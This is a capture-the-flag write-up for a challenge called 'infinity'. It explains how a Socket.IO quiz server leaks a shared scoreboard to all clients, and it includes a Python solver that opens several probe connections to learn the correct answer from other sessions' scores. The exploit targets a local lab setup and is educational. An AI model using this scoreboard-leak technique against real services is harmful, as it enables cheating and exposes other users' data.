# infinity (∞)

## Setup

```bash
docker-compose up
```

## Solution

`scoreboard` variable in `server/app.ts` is the following object such as:

```js
scoreboard = {
  'sid1': 0,
  'sid2': 2,
  'sid3': 1,
}
```

Use the following behavior to get the correct answer:

- `scoreboard` is shared by all connections on the server side.
  Therefore, we can see other players' scores.
- When the client emits the answer, the server side judges success or failure.
  If the answer sent by the client is correct, `scoreboard[socket.id] += 1` in the server side.
- When the client connects (WebSocket `connect`), the server sends GameState containing the `scoreboard`

And if we send the correct answer 21 times, the server will emit the flag.
Therefore we can get the flag.

solver.py

```python
import socketio


SOCKET_URL = "http://localhost:1024"

sio_org = socketio.Client()


@sio_org.event
def connect():
    print("connection established")


@sio_org.event
def gameState(data):
    if "correctAnswer" in data.keys():
        return

    connected_sids = []
    for i in range(4):
        sio = socketio.SimpleClient()
        sio.connect(SOCKET_URL)
        sio.emit("answer", i)
        connected_sids.append(sio.sid)

    sio_for_answer = socketio.SimpleClient()
    sio_for_answer.connect(SOCKET_URL)
    event = sio_for_answer.receive()

    scoreboard = event[1]["scoreboard"]

    correct_answer_sid = [
        k for k, v in scoreboard.items() if k in connected_sids and v == 1
    ][0]
    correct_answer = connected_sids.index(correct_answer_sid)
    print(f"{correct_answer=}")
    sio_org.emit("answer", correct_answer)


@sio_org.event
def flag(data):
    print(data)


sio_org.connect(SOCKET_URL)
sio_org.wait()
```
